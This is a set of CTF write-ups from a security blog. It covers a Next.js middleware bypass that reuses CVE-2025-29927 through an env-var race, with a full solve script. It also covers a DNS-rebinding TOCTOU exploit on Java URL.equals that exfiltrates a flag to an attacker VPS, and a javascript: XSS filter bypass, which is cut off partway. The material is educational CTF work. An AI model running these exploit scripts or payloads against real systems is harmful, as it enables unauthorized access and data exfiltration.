middleware\u0026hellip; aand why is that interesting? NextJS automatically generates internal JSON endpoints for SSR pages, e.g. /_next/data/\u0026lt;build-id\u0026gt;/admin/flag.json for the /admin/flag endpoint. These endpoints contain only the props needed for hydration or ISR, to avoid sending the full HTML each render. By default, the router rewrites a request like /_next/data/\u0026lt;build-id\u0026gt;/admin/flag.json to /admin/flag before it reaches middleware. Setting skipMiddlewareUrlNormalize disables that rewrite, so the JSON route no longer matches the /admin/:path* matcher and slips past the middleware. The challenge was running a hardcoded version of NextJS 15.2.3, meaning that the CVE-2025-29927 was not directly exploitable anymore.\nFun fact: After CVE-2025-29927 was patched, I decided to take a look on how they implemented the fix. Initially I expected that they had completely revisited the middleware request handling model (because there\u0026rsquo;s no way that\u0026rsquo;s a good design model). Then I remembered that we are talking about NextJS and that in the meantime the vulnerability had gone around the world. It certainly couldn\u0026rsquo;t be a quality patch to say the least.\nIn fact, this was the patch: https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\nThe commit message alone doesn\u0026rsquo;t inspire much confidence, it looks almost like a routine dev fix and not a critical security patch. At that time I decided to take a closer look and so I found myself reading the NextJS source code at 3 AM of a random Sunday.\nIn fact, I quickly realized that the \u0026ldquo;patch\u0026rdquo; wasn\u0026rsquo;t actually a fix, but rather a workaround: x-middleware-subrequest was still allowed from ingress requests, but now an 8-byte cryptographically random middlewareSubrequestId is generated and the header gets dropped if a x-middleware-subrequest-id doesn\u0026rsquo;t match that secret.\nThis means that the vulnerability is still there, but now you need to guess or leak the middlewareSubrequestId in order to exploit it.\nHere\u0026rsquo;s me the next day trolling with @salvatore.abello about that patch: sus nextjs CVE-2025-29927 patch WELL\u0026hellip; guess what happens a few days later?\nhttps://vercel.com/changelog/cve-2025-30218 Researchers found a way to leak the middlewareSubrequestId via external fetch requests in middleware and use it in x-middleware-subrequest to bypass middleware again. So, yeah, I was right and I basically missed out on an easy CVE + bounty üò≠\nAnyway, I definitely learned something these days about NextJS internals, and that was the reason why I solved this challenge, so let\u0026rsquo;s get back to it.\nSurely enough, we didn\u0026rsquo;t have to find another NextJS n-day about middleware bypasses, even though the NextJS version wasn\u0026rsquo;t the latest at the time of the event. Maybe it had something to do with that ugly patch just after 15.2.2. I kept that in mind and started looking into proxy/app.py.\nThis endpoint immediately caught my attention:\n@app.route(\u0026#39;/csrf\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def csrf(): token = request.form.get(\u0026#39;token\u0026#39;, token_hex(16))[:30].strip().encode(\u0026#34;utf-8\u0026#34;) if len(token) \u0026lt; 20: return Response(\u0026#39;Insecure CSRF Token.\u0026#39;, status=500) try: clear_csrf() environ[token.decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;ignore\u0026#34;)] = CSRF_TOKEN token = int(token, 16) return Response(\u0026#39;Set valid CSRF Token.\u0026#39;, status=200) except ValueError: return Response(\u0026#39;CSRF Token must be hex.\u0026#39;, status=500) The endpoints looks intended to set a CSRF token as env var to pass it later to the NextJS app, but the implementation is pretty bad. What actually happens here is that we can set any env var with a minimum length of 20 chars and a maximum of 30. Furthermore, we don\u0026rsquo;t control its value, since the value is the random hex token CSRF_TOKEN generated by token_hex(16), at the beginning of app.py.\nWhat we can do, however, is set any env var of that length constraint that will be interpreted as on-off switch. Note that it doesn\u0026rsquo;t have to be a valid hex string, because any ValueError will be caught and the env var is set on environ beforehand anyway.\nSince the NextJS app is started using subprocess.run, it inherits the environment variables from the proxy/app.py process. This means any environment variable set via the /csrf endpoint will be propagated to the NextJS app\u0026rsquo;s runtime environment when npm run start (and thus next start) is executed.\nThe NextJS app can be started via the /start endpoint, but here one thing can be problematic:\n@app.route(\u0026#39;/start\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def start(): clear_csrf() environ[\u0026#39;CSRF_TOKEN\u0026#39;] = CSRF_TOKEN global STARTED if STARTED: return Response(\u0026#34;Start already initiated\u0026#34;, status=428) with start_lock: if STARTED: return Response(\u0026#34;Start already initiated\u0026#34;, status=428) STARTED = True try: run([\u0026#39;sleep\u0026#39;, \u0026#39;3\u0026#39;], check=False) # make sure lock is aquired print(f\u0026#34;Starting Next.js instance with environ: {environ}\u0026#34;) run([\u0026#39;./start.sh\u0026#39;], cwd=\u0026#39;../next\u0026#39;, check=True) return Response(\u0026#34;Starting üëç...\u0026#34;, status=200) except CalledProcessError as e: return Response(f\u0026#34;Start Error: {str(e)}\u0026#34;, status=500) except Exception as e: return Response(f\u0026#34;Unexpected Error: {str(e)}\u0026#34;, status=500) As we can see, at the beginning of the function, the clear_csrf() function is called, which clears any env var whose value matches the CSRF_TOKEN value. Remember that we don\u0026rsquo;t control the value of the env vars set via the /csrf endpoint, and that value is exactly CSRF_TOKEN. This effectively clears any env var we set before calling the /start endpoint.\nBut wait, that\u0026rsquo;s the point! we can set the env var after calling the /start endpoint and the clear_csrf() function execution, but we need to make sure that the env var is set before the start.sh command launches the NextJS app.\nThis results in a race condition between the /csrf and /start endpoints, but that\u0026rsquo;s actually trivial since the code is running sleep 3 before starting the NextJS app, giving us more than enough race window to set the env var.\nNow, we needed to find an env var that matches length constraints that can cause some interesting behavior.\nSolution # Based on the previous experience I immediately knew which components of the NextJS source code to look at. Indeed, the first thing I did was to look inside next/src/server/lib/server-ipc/utils.ts, where the INTERNAL_HEADERS blacklist is defined. This blacklist is then used to filter out ingress request headers via the filterInternalHeaders function, where the CVE-2025-29927 patch was made.\nhttps://github.com/vercel/next.js/blob/v15.2.3/packages/next/src/server/lib/server-ipc/utils.ts#L40-L72\n// These are headers that are only used internally and should // not be honored from the external request const INTERNAL_HEADERS = [ \u0026#39;x-middleware-rewrite\u0026#39;, \u0026#39;x-middleware-redirect\u0026#39;, \u0026#39;x-middleware-set-cookie\u0026#39;, \u0026#39;x-middleware-skip\u0026#39;, \u0026#39;x-middleware-override-headers\u0026#39;, \u0026#39;x-middleware-next\u0026#39;, \u0026#39;x-now-route-matches\u0026#39;, \u0026#39;x-matched-path\u0026#39;, ] export const filterInternalHeaders = ( headers: Record\u0026lt;string, undefined | string | string[]\u0026gt; ) =\u0026gt; { for (const header in headers) { if (INTERNAL_HEADERS.includes(header)) { delete headers[header] } // If this request didn\u0026#39;t origin from this session we filter // out the \u0026#34;x-middleware-subrequest\u0026#34; header so we don\u0026#39;t skip // middleware incorrectly if ( header === \u0026#39;x-middleware-subrequest\u0026#39; \u0026amp;\u0026amp; headers[\u0026#39;x-middleware-subrequest-id\u0026#39;] !== (globalThis as any)[Symbol.for(\u0026#39;@next/middleware-subrequest-id\u0026#39;)] ) { delete headers[\u0026#39;x-middleware-subrequest\u0026#39;] } } } I then searched for all references to filterInternalHeaders function, and it appeared to be used only in next/server/lib/router-server.ts, where the request handler entrypoint is defined. And the following lines surely caught my attention:\nhttps://github.com/vercel/next.js/blob/v15.2.3/packages/next/src/server/lib/router-server.ts#L184-L188\nconst requestHandlerImpl: WorkerRequestHandler = async (req, res) =\u0026gt; { // internal headers should not be honored by the request handler if (!process.env.NEXT_PRIVATE_TEST_HEADERS) { filterInternalHeaders(req.headers) } [...] NEXT_PRIVATE_TEST_HEADERS was acting as an on-off switch to bypass the filterInternalHeaders function!\nWith NEXT_PRIVATE_TEST_HEADERS set, x-middleware-subrequest is no longer deleted internally by NextJS, even without the x-middleware-subrequest-id header, meaning it\u0026rsquo;s CVE-2025-29927 all over again!\nNEXT_PRIVATE_TEST_HEADERS is probably just used for unit testing purposes, but that was exactly what we needed to solve the challenge.\nAt this point, it was just a matter of putting everything together and win!\nHere\u0026rsquo;s my final solve script:\nexploit.py\nimport asyncio import httpx CHALL_URL = \u0026#34;http://localhost:8003\u0026#34; async def start_next(client): r = await client.post(f\u0026#34;{CHALL_URL}/start\u0026#34;) r.raise_for_status() return r.text async def set_env(client, env: str): r = await client.post(f\u0026#34;{CHALL_URL}/csrf\u0026#34;, data={\u0026#34;token\u0026#34;: env}) if r.status_code == 500: # it\u0026#39;s fine, env var was set anyway pass return r.text async def get_flag(client): headers = { #\u0026#34;x-nextjs-data\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;x-middleware-subrequest\u0026#34;: \u0026#34;src/middleware:src/middleware:src/middleware:src/middleware:src/middleware\u0026#34; } r = await client.get(f\u0026#34;{CHALL_URL}/admin/flag\u0026#34;, headers=headers) return (r.status_code, r.text) async def main(): async with httpx.AsyncClient(timeout=None) as client: starter = asyncio.create_task(start_next(client)) await asyncio.sleep(1) # mini race to set env var print(await set_env(client, \u0026#34;NEXT_PRIVATE_TEST_HEADERS\u0026#34;)) print(await starter) await asyncio.sleep(1) # wait for the nextjs app to start _, html = await get_flag(client) if \u0026#34;fake{\u0026#34; in html: print(\u0026#34;üê¥üê¥üê¥üê¥\u0026#34;) #print(html) if __name__ == \u0026#34;__main__\u0026#34;: asyncio.run(main()) Props to my teammate @witer33 for solving the challenge with me and securing first blood üê¥\nbctf{weird_proxy_set_env_bypass_fix_230c35fd62e384ed65f83abd35b4aac6}\n","date":"25 April 2025","externalUrl":null,"permalink":"/posts/b01lers-ctf-2025/njaas/","section":"Blog","summary":"Another view on how the popular CVE-2025-29927 NextJS middleware bypass could still be exploited.","title":"b01lersCTF 2025 - njaas","type":"posts"},{"content":"","date":"25 April 2025","externalUrl":null,"permalink":"/tags/cve-2025-29927/","section":"Tags","summary":"","title":"CVE-2025-29927","type":"tags"},{"content":"","date":"25 April 2025","externalUrl":null,"permalink":"/tags/cve-2025-30218/","section":"Tags","summary":"","title":"CVE-2025-30218","type":"tags"},{"content":"","date":"25 April 2025","externalUrl":null,"permalink":"/tags/nextjs/","section":"Tags","summary":"","title":"NextJS","type":"tags"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/dns-rebinding/","section":"Tags","summary":"","title":"DNS Rebinding","type":"tags"},{"content":" Update:\nThis writeup was selected as one of the winners of the Iris CTF 2025 writeup competition \u0026ndash;\u0026gt; https://discord.com/channels/1051808836593397781/1051815606732738590/1333226270699294800 TL;DR # The challenge consisted in exploiting a TOCTOU race condition by using DNS rebinding to bypass URL.equals() check in Java.\nDescription # I made a service to convert webhooks into webhooks.\nSource code analysis # Upon extracting the challenge attachments, it will present itself as a Kotlin-based Spring Boot application with very minimal code.\nIn fact the only relevant files to us are WebwebhookhookApplication.kt, State.kt and controller/MainController.kt.\nState.kt\n1package tf.irisc.chal.webwebhookhook 2 3import java.net.URI 4import java.net.URL 5 6class StateType( 7 hook: String, 8 var template: String, 9 var response: String 10 ) { 11 var hook: URL = URI.create(hook).toURL() 12} 13 14object State { 15 var arr = ArrayList\u0026lt;StateType\u0026gt;() 16} The StateType class is being defined to store an hook URL, a mutable template string and a mutable response string. Note that in the constructor, the hook declaration is being shadowed by var hook: URL = URI.create(hook).toURL(), meaning that it will accept hook parameter as string but it\u0026rsquo;ll be casted as an URL object immediately.\nThe StateType class is later used as Collection argument for ArrayList stored inside State.arr.\nThe State object is defined as singleton, meaning there is exactly one instance of State in the entire application.\nThis pattern effectively gives the application a simple in-memory database of all registered hooks and their associated templates.\nWebwebhookhookApplication.kt\n1package tf.irisc.chal.webwebhookhook 2 3import org.springframework.boot.autoconfigure.SpringBootApplication 4import org.springframework.boot.runApplication 5 6@SpringBootApplication 7class WebwebhookhookApplication 8 9const val FLAG = \u0026#34;irisctf{test_flag}\u0026#34;; 10 11fun main(args: Array\u0026lt;String\u0026gt;) { 12 State.arr.add(StateType( 13 \u0026#34;http://example.com/admin\u0026#34;, 14 \u0026#34;{\\\u0026#34;data\\\u0026#34;: _DATA_, \\\u0026#34;flag\\\u0026#34;: \\\u0026#34;\u0026#34; + FLAG + \u0026#34;\\\u0026#34;}\u0026#34;, 15 \u0026#34;{\\\u0026#34;response\\\u0026#34;: \\\u0026#34;ok\\\u0026#34;}\u0026#34;)) 16 runApplication\u0026lt;WebwebhookhookApplication\u0026gt;(*args) 17} This is the main entry point for the application. Here an entry is being added in the global State object, using:\nhttp://example.com/admin as value for the hook parameter. {\u0026quot;data\u0026quot;: _DATA_, \u0026quot;flag\u0026quot;: \u0026quot;irisctf{test_flag}\u0026quot;} as value for the template string. {\u0026quot;response\u0026quot;: \u0026quot;ok\u0026quot;} as value for the response string. Let\u0026rsquo;s analyze the application further to understand how we might be able to read that flag.\ncontroller/MainController.kt\n1package tf.irisc.chal.webwebhookhook.controller 2 3import org.springframework.http.MediaType 4import org.springframework.stereotype.Controller 5import org.springframework.ui.Model 6import org.springframework.web.bind.annotation.* 7import tf.irisc.chal.webwebhookhook.State 8import tf.irisc.chal.webwebhookhook.StateType 9import java.net.HttpURLConnection 10import java.net.URI 11 12@Controller 13class MainController { 14 15 @GetMapping(\u0026#34;/\u0026#34;) 16 fun home(model: Model): String { 17 return \u0026#34;home.html\u0026#34; 18 } 19 20 @PostMapping(\u0026#34;/webhook\u0026#34;) 21 @ResponseBody 22 fun webhook(@RequestParam(\u0026#34;hook\u0026#34;) hook_str: String, @RequestBody body: String, @RequestHeader(\u0026#34;Content-Type\u0026#34;) contentType: String, model: Model): String { 23 var hook = URI.create(hook_str).toURL(); 24 for (h in State.arr) { 25 if(h.hook == hook) { 26 var newBody = h.template.replace(\u0026#34;_DATA_\u0026#34;, body); 27 var conn = hook.openConnection() as? HttpURLConnection; 28 if(conn === null) break; 29 conn.requestMethod = \u0026#34;POST\u0026#34;; 30 conn.doOutput = true; 31 conn.setFixedLengthStreamingMode(newBody.length); 32 conn.setRequestProperty(\u0026#34;Content-Type\u0026#34;, contentType); 33 conn.connect() 34 conn.outputStream.use { os -\u0026gt; 35 os.write(newBody.toByteArray()) 36 } 37 38 return h.response 39 } 40 } 41 return \u0026#34;{\\\u0026#34;result\\\u0026#34;: \\\u0026#34;fail\\\u0026#34;}\u0026#34; 42 } 43 44 @PostMapping(\u0026#34;/create\u0026#34;, consumes = [MediaType.APPLICATION_JSON_VALUE]) 45 @ResponseBody 46 fun create(@RequestBody body: StateType): String { 47 for(h in State.arr) { 48 if(body.hook == h.hook) 49 return \u0026#34;{\\\u0026#34;result\\\u0026#34;: \\\u0026#34;fail\\\u0026#34;}\u0026#34; 50 } 51 State.arr.add(body) 52 return \u0026#34;{\\\u0026#34;result\\\u0026#34;: \\\u0026#34;ok\\\u0026#34;}\u0026#34; 53 } 54} The router for the Spring Boot Application is configured to have the /create and the /webhook endpoints.\nThe /create endpoint accepts POST requests with application/json body that will be casted as StateType. Then it checks if an entry with same hook is already occurring in the global State object, and if so, it will return a json response of {\u0026quot;result\u0026quot;: \u0026quot;fail\u0026quot;}. After iterating the ArrayList, if no matching instances were found, a new StateType entry will be appended.\nEssentially, this endpoint registers a new webhook configuration, unless it already exists. The /webhook endpoint will accept POST requests with a hook parameter. It will iterate over the State.arr global list of previously created webhook configurations, and if it finds a matching hook URL, it will replace the _DATA_ placeholder in the template with the content of the supplied body, and send a POST request to the given hook URL using HttpURLConnection with the new body. If the hook URL is not found in the State.arr, it will return a json response of {\u0026quot;result\u0026quot;: \u0026quot;fail\u0026quot;}. Note\nBoth endpoints do not provide SSRF protections, however it\u0026rsquo;s irrelevant for us as there are no additional services running on the server. Vulnerability discovery # At first glance, there doesn\u0026rsquo;t seem to be an obvious way to intercept the flag, since the only way would be to successfully match the hook check and send the POST to example.org, which would be ez game if we were the admins of domain, which is not the case :P\nOne of my first steps was to try an HTTP smuggling, given the arbitrary control over the body that then replaces the content of _DATA_, to build a request like this:\nSmuggling attempt on body content. However, we note how the body of the request is correctly set based on the length of our payload at L31 with conn.setFixedLengthStreamingMode(newBody.length) consequently failing to delimit the stream of the request to build a new one. Furthermore, it is not possible to override the request headers and in any case it would be a matter of exploiting a Spring Boot HTTP desync but today will not be the day of 0-days :/\nFinally, in a scenario of arbitrary write in the system we could have tried to overwrite /etc/hosts file to override the DNS resolution of example.org and make it point to an IP under our control, but again, this is not the case for the challenge.\nDoomscrolling remembrance of a random tweet to win # At that point I was pretty lost, the code was really minimal and I had to somehow pull off a complete domain check bypass from a bunch of URL comparisons\u0026hellip;\nWait did I say \u0026ldquo;domain check bypass\u0026rdquo; and \u0026ldquo;url comparison\u0026rdquo; !?\nThat\u0026rsquo;s exactly what I said to myself while overthinking the challenge and immediately after I had the remembrance of a (quite strange) Java behavior that I barely read about in a random tweet months ago while doomscrolling on X, which pointed out how comparing two URL objects in Java triggers a DNS resolution üíÄ\nYour brain on Java is when comparing two strings REQUIRES A DNS LOOKUP pic.twitter.com/VYzNBFri5b\n\u0026mdash; Dmitrii Kovanikov (@ChShersh) September 8, 2024 More of that is discussed at the end of the writeup here.\nAt this point this enlightenment gave me a clear path to the resolution using DNS rebinding:\nsubmit to /endpoint a domain like rbndr.us that resolves to the IP of example.com. URL.equals() will trigger a DNS resolution on rbndr.us that will make succeed the check against example.com. make the rbndr.us domain resolve to different IP under our control. the POST request will be sent to the IP under our control, with the template body containing the flag. Yep. That\u0026rsquo;s it. Simple as that right?\nü•≤\nNo. ü•≤\nWell, kinda, in theory (and in practice) that would work, I confirmed that the DNS resolution was made on the provided domain and by using a DNS rebinding service like rbndr.us I was able to get different response status codes from the server (because different domains were resolved each time).\nThis behavior was caused by the under the hood work of rbndr, which as explained on their repo, all it does is simply provide a domain that resolves to IP A with a very low TTL, and then immediately switches the DNS resolution to IP B so that when a new DNS query is made to the same domain the second time it\u0026rsquo;ll point a different IP address.\nAll of that is the basics of how a DNS rebinding attack works, which you can read more about here.\nThe main hurdle however was not to make DNS rebinding work, but to leverage DNS rebinding to cause a Time-of-check to time-of-use (TOCTOU) type race when:\n1) the domain DNS resolves to example.org IP to make the URL.equals() succeed\nand\n2) the server opens a connection against my domain (causing a new DNS resolution) to send the request with the flag.\nTOCTOU race + DNS cache revalidation # Unfortunately for my sanity, as we can see from the code between L23 and L25, trying to exploit such a window between the check and the socket connection, meant finding a precision of a matter of milliseconds.\n23if(h.hook == hook) { 24 var newBody = h.template.replace(\u0026#34;_DATA_\u0026#34;, body); 25 var conn = hook.openConnection() as? HttpURLConnection; Moreover, Java\u0026rsquo;s built-in DNS cache mechanism made things even more complicated.\nWhile testing my basic DNS rebinding primitive, I noticed that I was getting the same status code in response to the /webhook endpoint for a period of 30 seconds. This sounded a bit strange to me since my DNS server was configured to reply with a 1 second TTL. In fact, what I did was a quick sanity check using both curl and python, and from both these clients the response to my rebinder domain kept changing every second:\nPython DNS test: caching NOT enabled Java DNS test: caching enabled \u0026quot;idk if java is doing some weird caching, python and curl behave differently. Trying multithread. I think i\u0026rsquo;m dossing example.org\u0026quot; üíÄ Clearly some caching was at work in the Java side. It turns out that Java caches a DNS resolution for 30 seconds, which meant that we wanted to get our timing right when sending payload to the /webhook endpoint, so that the cache would be fetched at the time of comparison against example.org, to be invalidated immediately afterwards, thus requiring a cache revalidation at the time of the socket connection to send the flag to a domain under our control.\nBelow I\u0026rsquo;ve illustrated the attack workflow.\nsequenceDiagram title DNS Rebinding attack flow on Java `URL.equals()` participant Attacker as Attacker participant ChallengeServer as Challenge Server participant AttackerServer as Attacker Rebinder Service (xxxx.rbndr.us) participant DNS as Attacker DNS Server Attacker-\u003e\u003eChallengeServer: POST /endpoint ?hook=xxxx.rbndr.us note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP) note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP) note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP) note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP) note over DNS: ... note over ChallengeServer: 1) the server code uses URL.equals() to compare ‚Äúxxxx.rbndr.us‚Äù vs ‚Äúexample.org‚Äù ChallengeServer-\u003e\u003eDNS: DNS Query A for xxxx.rbndr.us note over DNS: 2) DNS A Record is 93.184.215.14, TTL=1 (example.org IP) DNS--\u003e\u003eChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 93.184.215.14 note over ChallengeServer: 3) URL.equals() returns true because IP matches example.org note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP) note over ChallengeServer: 4) hook.openConnection() where hook=xxxx.rbndr.us ChallengeServer-\u003e\u003eDNS: DNS Query A for xxxx.rbndr.us note over DNS: 5) DNS A Record is 83.130.170.16, TTL=1 (attacker IP) DNS ‚Äúrebinding‚Äù event, xxxx.rbndr.us is resolving to Attacker's IP DNS--\u003e\u003eChallengeServer: DNS A response (TTL=1) for xxxx.rbndr.us: 83.130.170.16 note over ChallengeServer: 5) Opens HTTP connection to 83.130.170.16 note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP) note over DNS: ... ChallengeServer-\u003e\u003eAttacker: POST to 83.130.170.16 {\"flag\":\"irisctf{...}\"} Attacker--\u003e\u003eAttacker: Captures the flag (win) A trick I used to increase my chances of hitting the exact window between Step 1 and Step 4 was to send a large payload in the body to be processed, so that L34 would have a slightly longer execution time to give us the possibility of hitting the cache revalidation switch in a larger window.\nNOTE\nAn interesting rabbit hole would be to understand how String.replace() is performed internally by Java/Kotlin, since there could be the possibility of using some classic ReDoS tricks to increase the execution time of h.template.replace(\u0026quot;_DATA_\u0026quot;, body) even more. Exploitation (cry and pray) # Having gathered all the elements to exploit, I proceeded to write the following python script:\nexploit.py\n#!/usr/bin/python3 import requests import time import threading from concurrent.futures import ThreadPoolExecutor, as_completed RBNDR = \u0026#34;http://5db8d70e.5e82aa10.rbndr.us\u0026#34; CHALL_URL = \u0026#34;https://webwebhookhook-43435a7246999280.i.chal.irisc.tf\u0026#34; BATCH_SIZE = 20 DELAY_BETWEEN_BATCHES = 0.1 req_id = 0 req_id_lock = threading.Lock() def send_request(session, url, payload): global req_id try: response = session.post(url, headers={\u0026#34;Content-Type\u0026#34;:\u0026#34;application/x-www-form-urlencoded\u0026#34;}, data=payload, timeout=10) with req_id_lock: req_id += 1 current_id = req_id print(f\u0026#34;{current_id} {response.text} {response.status_code}\u0026#34;) except Exception as e: with req_id_lock: req_id += 1 current_id = req_id print(f\u0026#34;{current_id} Error: {e}\u0026#34;) def main(): url = f\u0026#34;{CHALL_URL}/webhook?hook={RBNDR}/admin\u0026#34; # we need to also match url path payload = \u0026#34;A\u0026#34;*1000 with requests.Session() as session: with ThreadPoolExecutor(max_workers=BATCH_SIZE) as executor: while True: futures = [ executor.submit(send_request, session, url, payload) for _ in range(BATCH_SIZE) ] for future in as_completed(futures): pass time.sleep(DELAY_BETWEEN_BATCHES) if __name__ == \u0026#34;__main__\u0026#34;: main() A little bit of explanation for it:\nThe RBNDR url was constructed with a rebinder service using the example.com IP as the first IP and my VPS IP as the second IP. I opted for a requests batched approach to have an high density of requests in a short time window. Large body payload to increase the execution time of h.template.replace(\u0026quot;_DATA_\u0026quot;, body) and thus increasing the duration of the target window. Spamming the /webhook to have different DNS cache revalidation timings and increase the chances of an IP switch happening inside the target window. So, at this point i just run the exploit, prayed and went to have lunch, aaand when i got back i saw this in my VPS console output\nRequest with the flag received on the VPS Extra # But why the hell does Java do DNS resolutions on simple == comparisons? # While many weird Java behaviors could be simply explained with the phrase \u0026ldquo;because Java.\u0026rdquo; I wanted to try to justify why the Java devs choose to do DNS resolutions on simple equal comparisons.\nLet\u0026rsquo;s start from the fact that mainly in Java everything is an object allocated in the heap, except for primitives like int, char, byte, long, String and a few more. Therefore when the JVM has to do comparison of two objects, to see if those two objects are equal, it must check that they are equal in every way. In fact, if you create two objects of two identical classes, their comparison will return false because they have different references in memory.\nAs a result Java devs probably said something like \u0026ldquo;you don\u0026rsquo;t like it? jk what? Implement the damn comparison by yourself\u0026rdquo;. So practically every object in Java has its own magic method .equals() which corresponds to its custom implementation to do more intelligent checks and not make two objects have to be just two deep copies to be equal.\nWhoever wrote the URL class thought well that to effectively check that two URL objects are equal, they not only must have every property in common (path, protocol, port, \u0026hellip;) but must also resolve to the same IP. To find out this, obviously Java needs to perform a DNS resolution.\nQuestionable choice? Absolutely.\nThis is what it is anyway? Yes and we have to live with it and in case we simply want to compare two URLs as strings we should use the URI class.\nFun Fact: as someone said in this not so happy discussion about this behavior here, that choice was originally made to prevent DNS rebinding attacks.\nFlag: irisctf{url_equals_rebind}\n","date":"12 January 2025","externalUrl":null,"permalink":"/posts/irisctf-2025/webwebhookhook/","section":"Blog","summary":"Writeup for webwebhookhook web challenge of IrisCTF 2025","title":"IrisCTF 2025 - webwebhookhook","type":"posts"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/race-condition/","section":"Tags","summary":"","title":"Race Condition","type":"tags"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/toctou/","section":"Tags","summary":"","title":"TOCTOU","type":"tags"},{"content":"","date":"12 January 2025","externalUrl":null,"permalink":"/tags/writeup/","section":"Tags","summary":"","title":"Writeup","type":"tags"},{"content":" RaaS - MOCA CTF Quals 2024 # TL;DR # The challenge involved achieving User Interaction XSS inside a Flask template through the javascript: pseudo protocol. This was accomplished bypassing a filtering regex and blacklisted characters. 0. Description # A simple click-to-xss to warmup.\n1. Challenge scenario # We\u0026rsquo;re given a form in which it is possible to insert a link, a title, and be redirected to that URL. There is also the possibility of sending this link to the admin who will in turn be redirected.\nRaaS first look Source code is provided, so we\u0026rsquo;ll look into that to understand what\u0026rsquo;s happening.\n1.1) Source code analysis # The project is divided into two parts: the main application and the admin bot. We\u0026rsquo;ll look into the application code first.\napp.py\nfrom flask import Flask, request, render_template, Response, redirect,jsonify, make_response, g, redirect, send_file import requests import urllib.parse import re app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def main_page(): return render_template(\u0026#39;home.html\u0026#39;) def check_url(url): url = url.lower() pattern = r\u0026#39;[()=$`]\u0026#39; if bool(re.search(pattern, url, re.IGNORECASE | re.DOTALL)): return False if url.startswith(\u0026#34;j\u0026#34;) or \u0026#34;javascript\u0026#34; in url: return False return True def check_title(title): if \u0026#34;\u0026lt;\u0026#34; in title or \u0026#34;\u0026gt;\u0026#34; in title: return False return True @app.route(\u0026#39;/redirectTo\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def redirect_to(): url = request.args.get(\u0026#34;url\u0026#34;) title = request.args.get(\u0026#34;title\u0026#34;) default_url = \u0026#34;https://www.youtube.com/watch?v=xvFZjo5PgG0\u0026amp;ab_channel=Duran\u0026#34; if not isinstance(title,str) or not isinstance(url,str): return render_template(\u0026#39;redirect.html\u0026#39;,url=default_url, title=\u0026#34;title\u0026#34;) url = url.strip() if not check_url(url) or not check_title(title): return render_template(\u0026#34;redirect.html\u0026#34;, title=title, url=default_url) return render_template(\u0026#39;redirect.html\u0026#39;,url=url, title=title) @app.route(\u0026#39;/redirectAdmin\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def redirect_admin(): default_url = \u0026#34;https://www.youtube.com/watch?v=xvFZjo5PgG0\u0026amp;ab_channel=Duran\u0026#34; admin_bot = \u0026#34;http://raas-admin:3000/report_to_admin\u0026#34; url = request.args.get(\u0026#34;url\u0026#34;) title = request.args.get(\u0026#34;title\u0026#34;) if not isinstance(title,str) or not isinstance(url,str): requests.post(admin_bot, json={\u0026#34;url\u0026#34;:default_url, \u0026#34;title\u0026#34;:\u0026#34;title\u0026#34;}) return jsonify({\u0026#34;message\u0026#34;:\u0026#34;done\u0026#34;}), 201 url = url.strip() if not check_url(url) or not check_title(title): requests.post(admin_bot, json={\u0026#34;url\u0026#34;:default_url, \u0026#34;title\u0026#34;:\u0026#34;title\u0026#34;}) return jsonify({\u0026#34;message\u0026#34;:\u0026#34;done\u0026#34;}), 201 requests.post(admin_bot, json={\u0026#34;url\u0026#34;:url, \u0026#34;title\u0026#34;:title}) return jsonify({\u0026#34;message\u0026#34;:\u0026#34;done\u0026#34;}), 201 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=5000) Clicking on the \u0026ldquo;Get Redirected!\u0026rdquo; button will trigger the /redirectTo route, which is anyway triggered also by the \u0026ldquo;Redirect the Admin!\u0026rdquo; button that executes the /redirectAdmin route. The first endpoint accepts the url and title parameters which must be strings and later passed to the check_url() and check_title() sanitizing functions. If we can bypass that with a working payload, we\u0026rsquo;ll have XSS. The second endpoint forwards the given URL to the admin bot, which simply goes to the /redirectTo endpoint with our inputs, and simulates a button click on the \u0026ldquo;Follow Link\u0026rdquo; button.\nThe check_url function aims to sanitize the URL input by converting it to lowercase, hence avoiding all the lowercase-uppercase payloads like jAvAsCriPt:aLeRt(1). It also check for the presence of some special characters with the regex r'[()=$`]' that will limit us later on exploitation. Particularly, it ensures the URL does not start with \u0026ldquo;j\u0026rdquo; character or contain the substring \u0026ldquo;javascript\u0026rdquo;. This comes out as the main limitation for us, since it should block the payloads with the javascript pseudo protocol.\nAt this point, a simple way out will be any other working pseudo protocol XSS payload like data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4. However, if we try so, the browser will insult us with:\nMy approach at this point was to split the checks individually in the source code an try to bypass them one by one.\n2. Exploitation # Below I will explain how I bypassed each of them, doing it with a bottom-up approach cause I found it more convenient.\n2.1) \u0026ldquo;javascript\u0026rdquo; not allowed bypass # We\u0026rsquo;re not allowed to use the string \u0026ldquo;javascript\u0026rdquo; anywhere in our URL, so\u0026hellip;just don\u0026rsquo;t use it! We will write\njava script instead. Here we are using a newline character to bypass the check. Since in the Python side \u0026quot;java\\x0Ascript\u0026quot; != \u0026quot;javascript\u0026quot;, but in the broswer java%0Ascript will still be considered a valid url for the javascript protocol.\nNote\nOur input get stripped before getting into che sanitizing function, however Python strip() function only removes leading and trailing characters. Even though this is a common bypass, I never actually knew why this was working. Researching for bypasses for the javascript pseudo protocol I\u0026rsquo;ve found this blog which was helpful to me to find out the reason why whitespaces are allowed in this situation and find out the bypass for the next filter. The reason seems to rely in the URL spec standard which removes any 